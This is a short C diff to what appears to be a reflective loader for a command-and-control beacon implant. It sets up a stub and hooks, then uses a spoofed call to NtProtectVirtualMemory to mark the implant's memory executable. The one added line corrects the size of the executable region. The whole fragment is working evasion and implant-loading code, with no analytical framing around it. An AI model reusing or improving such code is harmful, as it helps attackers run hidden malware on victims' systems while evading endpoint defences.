@@ -181,6 +181,7 @@ SECTION( B ) VOID Loader( VOID )
             fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
             installHooks( Map, MemoryBuffer, Reg.NT );
 
+            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
             ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
             Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
